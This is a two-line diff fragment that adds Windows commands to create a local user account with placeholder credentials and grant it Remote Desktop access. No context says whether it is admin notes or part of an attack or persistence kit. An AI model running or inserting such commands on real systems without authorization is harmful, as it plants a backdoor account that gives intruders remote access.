@@ -1,0 +1,2 @@
+cmd.exe /c net user /add <username> <password>
+cmd.exe /c net LOCALGROUP "Remote Desktop Users" <username> /ADD 
